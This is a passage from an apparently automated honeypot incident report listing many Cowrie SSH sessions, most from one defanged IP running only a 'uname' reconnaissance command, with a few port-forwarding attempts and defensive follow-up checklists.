| `2026-08-24 01:29:32` | `cowrie.client.version` |
| `2026-08-24 01:29:32` | `cowrie.client.kex` |
| `2026-08-24 01:29:32` | `cowrie.login.success` |
| `2026-08-24 01:29:33` | `cowrie.session.params` |
| `2026-08-24 01:29:33` | `cowrie.command.input` |
| `2026-08-24 01:29:33` | `cowrie.log.closed` |
| `2026-08-24 01:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8b5f6f7157d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:29 |
| **Last Seen** | 2026-08-24 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:29:36` | `cowrie.session.connect` |
| `2026-08-24 01:29:36` | `cowrie.client.version` |
| `2026-08-24 01:29:37` | `cowrie.client.kex` |
| `2026-08-24 01:29:37` | `cowrie.login.success` |
| `2026-08-24 01:29:38` | `cowrie.session.params` |
| `2026-08-24 01:29:38` | `cowrie.command.input` |
| `2026-08-24 01:29:38` | `cowrie.log.closed` |
| `2026-08-24 01:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dec2fcae2ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:29 |
| **Last Seen** | 2026-08-24 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:29:42` | `cowrie.session.connect` |
| `2026-08-24 01:29:42` | `cowrie.client.version` |
| `2026-08-24 01:29:42` | `cowrie.client.kex` |
| `2026-08-24 01:29:42` | `cowrie.login.success` |
| `2026-08-24 01:29:43` | `cowrie.session.params` |
| `2026-08-24 01:29:43` | `cowrie.command.input` |
| `2026-08-24 01:29:43` | `cowrie.log.closed` |
| `2026-08-24 01:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdd3f2001015

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:29 |
| **Last Seen** | 2026-08-24 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:29:47` | `cowrie.session.connect` |
| `2026-08-24 01:29:47` | `cowrie.client.version` |
| `2026-08-24 01:29:47` | `cowrie.client.kex` |
| `2026-08-24 01:29:47` | `cowrie.login.success` |
| `2026-08-24 01:29:48` | `cowrie.session.params` |
| `2026-08-24 01:29:48` | `cowrie.command.input` |
| `2026-08-24 01:29:48` | `cowrie.log.closed` |
| `2026-08-24 01:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ec443230d7f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:29 |
| **Last Seen** | 2026-08-24 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:29:52` | `cowrie.session.connect` |
| `2026-08-24 01:29:52` | `cowrie.client.version` |
| `2026-08-24 01:29:52` | `cowrie.client.kex` |
| `2026-08-24 01:29:53` | `cowrie.login.success` |
| `2026-08-24 01:29:53` | `cowrie.session.params` |
| `2026-08-24 01:29:53` | `cowrie.command.input` |
| `2026-08-24 01:29:53` | `cowrie.log.closed` |
| `2026-08-24 01:29:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f840f9dc56e3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:29 |
| **Last Seen** | 2026-08-24 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:29:57` | `cowrie.session.connect` |
| `2026-08-24 01:29:58` | `cowrie.client.version` |
| `2026-08-24 01:29:58` | `cowrie.client.kex` |
| `2026-08-24 01:29:58` | `cowrie.login.success` |
| `2026-08-24 01:29:59` | `cowrie.session.params` |
| `2026-08-24 01:29:59` | `cowrie.command.input` |
| `2026-08-24 01:29:59` | `cowrie.log.closed` |
| `2026-08-24 01:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-804ef38c3feb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:30 |
| **Last Seen** | 2026-08-24 01:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:30:03` | `cowrie.session.connect` |
| `2026-08-24 01:30:03` | `cowrie.client.version` |
| `2026-08-24 01:30:03` | `cowrie.client.kex` |
| `2026-08-24 01:30:03` | `cowrie.login.success` |
| `2026-08-24 01:30:04` | `cowrie.session.params` |
| `2026-08-24 01:30:04` | `cowrie.command.input` |
| `2026-08-24 01:30:04` | `cowrie.log.closed` |
| `2026-08-24 01:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c435eb570aa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:30 |
| **Last Seen** | 2026-08-24 01:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:30:08` | `cowrie.session.connect` |
| `2026-08-24 01:30:08` | `cowrie.client.version` |
| `2026-08-24 01:30:08` | `cowrie.client.kex` |
| `2026-08-24 01:30:08` | `cowrie.login.success` |
| `2026-08-24 01:30:09` | `cowrie.session.params` |
| `2026-08-24 01:30:09` | `cowrie.command.input` |
| `2026-08-24 01:30:09` | `cowrie.log.closed` |
| `2026-08-24 01:30:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8730c22b1cc4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:30 |
| **Last Seen** | 2026-08-24 01:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:30:13` | `cowrie.session.connect` |
| `2026-08-24 01:30:13` | `cowrie.client.version` |
| `2026-08-24 01:30:13` | `cowrie.client.kex` |
| `2026-08-24 01:30:14` | `cowrie.login.success` |
| `2026-08-24 01:30:15` | `cowrie.session.params` |
| `2026-08-24 01:30:15` | `cowrie.command.input` |
| `2026-08-24 01:30:15` | `cowrie.log.closed` |
| `2026-08-24 01:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cecce00261d6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:30 |
| **Last Seen** | 2026-08-24 01:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:30:18` | `cowrie.session.connect` |
| `2026-08-24 01:30:18` | `cowrie.client.version` |
| `2026-08-24 01:30:19` | `cowrie.client.kex` |
| `2026-08-24 01:30:19` | `cowrie.login.success` |
| `2026-08-24 01:30:20` | `cowrie.session.params` |
| `2026-08-24 01:30:20` | `cowrie.command.input` |
| `2026-08-24 01:30:20` | `cowrie.log.closed` |
| `2026-08-24 01:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba7741cee1da

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:30 |
| **Last Seen** | 2026-08-24 01:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:30:23` | `cowrie.session.connect` |
| `2026-08-24 01:30:24` | `cowrie.client.version` |
| `2026-08-24 01:30:24` | `cowrie.client.kex` |
| `2026-08-24 01:30:24` | `cowrie.login.success` |
| `2026-08-24 01:30:25` | `cowrie.session.params` |
| `2026-08-24 01:30:25` | `cowrie.command.input` |
| `2026-08-24 01:30:25` | `cowrie.log.closed` |
| `2026-08-24 01:30:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6233a0b6b430

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:30 |
| **Last Seen** | 2026-08-24 01:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:30:29` | `cowrie.session.connect` |
| `2026-08-24 01:30:29` | `cowrie.client.version` |
| `2026-08-24 01:30:29` | `cowrie.client.kex` |
| `2026-08-24 01:30:29` | `cowrie.login.success` |
| `2026-08-24 01:30:30` | `cowrie.session.params` |
| `2026-08-24 01:30:30` | `cowrie.command.input` |
| `2026-08-24 01:30:30` | `cowrie.log.closed` |
| `2026-08-24 01:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86d5299b0d91

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:30 |
| **Last Seen** | 2026-08-24 01:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:30:34` | `cowrie.session.connect` |
| `2026-08-24 01:30:34` | `cowrie.client.version` |
| `2026-08-24 01:30:34` | `cowrie.client.kex` |
| `2026-08-24 01:30:34` | `cowrie.login.success` |
| `2026-08-24 01:30:35` | `cowrie.session.params` |
| `2026-08-24 01:30:35` | `cowrie.command.input` |
| `2026-08-24 01:30:35` | `cowrie.log.closed` |
| `2026-08-24 01:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78e2fbb96e23

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:30 |
| **Last Seen** | 2026-08-24 01:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:30:39` | `cowrie.session.connect` |
| `2026-08-24 01:30:39` | `cowrie.client.version` |
| `2026-08-24 01:30:39` | `cowrie.client.kex` |
| `2026-08-24 01:30:40` | `cowrie.login.success` |
| `2026-08-24 01:30:41` | `cowrie.session.params` |
| `2026-08-24 01:30:41` | `cowrie.command.input` |
| `2026-08-24 01:30:41` | `cowrie.log.closed` |
| `2026-08-24 01:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebe9b364d7c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:30 |
| **Last Seen** | 2026-08-24 01:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:30:45` | `cowrie.session.connect` |
| `2026-08-24 01:30:45` | `cowrie.client.version` |
| `2026-08-24 01:30:45` | `cowrie.client.kex` |
| `2026-08-24 01:30:45` | `cowrie.login.success` |
| `2026-08-24 01:30:46` | `cowrie.session.params` |
| `2026-08-24 01:30:46` | `cowrie.command.input` |
| `2026-08-24 01:30:46` | `cowrie.log.closed` |
| `2026-08-24 01:30:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02b56e4dd2c7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:30 |
| **Last Seen** | 2026-08-24 01:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:30:50` | `cowrie.session.connect` |
| `2026-08-24 01:30:50` | `cowrie.client.version` |
| `2026-08-24 01:30:50` | `cowrie.client.kex` |
| `2026-08-24 01:30:50` | `cowrie.login.success` |
| `2026-08-24 01:30:51` | `cowrie.session.params` |
| `2026-08-24 01:30:51` | `cowrie.command.input` |
| `2026-08-24 01:30:51` | `cowrie.log.closed` |
| `2026-08-24 01:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8314204fe88a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:30 |
| **Last Seen** | 2026-08-24 01:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:30:55` | `cowrie.session.connect` |
| `2026-08-24 01:30:55` | `cowrie.client.version` |
| `2026-08-24 01:30:55` | `cowrie.client.kex` |
| `2026-08-24 01:30:56` | `cowrie.login.success` |
| `2026-08-24 01:30:57` | `cowrie.session.params` |
| `2026-08-24 01:30:57` | `cowrie.command.input` |
| `2026-08-24 01:30:57` | `cowrie.log.closed` |
| `2026-08-24 01:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-381edded9ac2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:00` | `cowrie.session.connect` |
| `2026-08-24 01:31:00` | `cowrie.client.version` |
| `2026-08-24 01:31:00` | `cowrie.client.kex` |
| `2026-08-24 01:31:00` | `cowrie.login.success` |
| `2026-08-24 01:31:01` | `cowrie.session.params` |
| `2026-08-24 01:31:01` | `cowrie.command.input` |
| `2026-08-24 01:31:01` | `cowrie.log.closed` |
| `2026-08-24 01:31:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48e51bb3af78

| Field | Detail |
|---|---|
| **Source IP** | `220.116.113[.]35` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:02` | `cowrie.session.connect` |
| `2026-08-24 01:31:03` | `cowrie.client.version` |
| `2026-08-24 01:31:03` | `cowrie.client.kex` |
| `2026-08-24 01:31:05` | `cowrie.login.success` |
| `2026-08-24 01:31:06` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:31:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.116.113[.]35` to AbuseIPDB if not already reported
- [ ] Block `220.116.113[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e0558c82427

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:05` | `cowrie.session.connect` |
| `2026-08-24 01:31:05` | `cowrie.client.version` |
| `2026-08-24 01:31:05` | `cowrie.client.kex` |
| `2026-08-24 01:31:05` | `cowrie.login.success` |
| `2026-08-24 01:31:06` | `cowrie.session.params` |
| `2026-08-24 01:31:06` | `cowrie.command.input` |
| `2026-08-24 01:31:06` | `cowrie.log.closed` |
| `2026-08-24 01:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ded4f2213e8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:07` | `cowrie.session.connect` |
| `2026-08-24 01:31:07` | `cowrie.client.version` |
| `2026-08-24 01:31:08` | `cowrie.client.kex` |
| `2026-08-24 01:31:08` | `cowrie.login.success` |
| `2026-08-24 01:31:09` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:31:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:31:09` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a17665a00a8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:10` | `cowrie.session.connect` |
| `2026-08-24 01:31:10` | `cowrie.client.version` |
| `2026-08-24 01:31:10` | `cowrie.client.kex` |
| `2026-08-24 01:31:11` | `cowrie.login.success` |
| `2026-08-24 01:31:12` | `cowrie.session.params` |
| `2026-08-24 01:31:12` | `cowrie.command.input` |
| `2026-08-24 01:31:12` | `cowrie.log.closed` |
| `2026-08-24 01:31:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-178bacc55305

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:12` | `cowrie.session.connect` |
| `2026-08-24 01:31:12` | `cowrie.client.version` |
| `2026-08-24 01:31:12` | `cowrie.client.kex` |
| `2026-08-24 01:31:13` | `cowrie.login.success` |
| `2026-08-24 01:31:13` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:31:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:31:13` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:31:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b368186533

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:15` | `cowrie.session.connect` |
| `2026-08-24 01:31:15` | `cowrie.client.version` |
| `2026-08-24 01:31:15` | `cowrie.client.kex` |
| `2026-08-24 01:31:16` | `cowrie.login.success` |
| `2026-08-24 01:31:17` | `cowrie.session.params` |
| `2026-08-24 01:31:17` | `cowrie.command.input` |
| `2026-08-24 01:31:17` | `cowrie.log.closed` |
| `2026-08-24 01:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e19c7ccf4269

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:20` | `cowrie.session.connect` |
| `2026-08-24 01:31:20` | `cowrie.client.version` |
| `2026-08-24 01:31:20` | `cowrie.client.kex` |
| `2026-08-24 01:31:21` | `cowrie.login.success` |
| `2026-08-24 01:31:22` | `cowrie.session.params` |
| `2026-08-24 01:31:22` | `cowrie.command.input` |
| `2026-08-24 01:31:22` | `cowrie.log.closed` |
| `2026-08-24 01:31:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bca8f38b798

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:31 |
| **Last Seen** | 2026-08-24 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:31:25` | `cowrie.session.connect` |
| `2026-08-24 01:31:25` | `cowrie.client.version` |
| `2026-08-24 01:31:25` | `cowrie.client.kex` |
| `2026-08-24 01:31:26` | `cowrie.login.success` |
| `2026-08-24 01:31:27` | `cowrie.session.params` |
| `2026-08-24 01:31:27` | `cowrie.command.input` |
| `2026-08-24 01:31:27` | `cowrie.log.closed` |
| `2026-08-24 01:31:27` | `cowrie.session.closed` |

**Recommended Actions:**
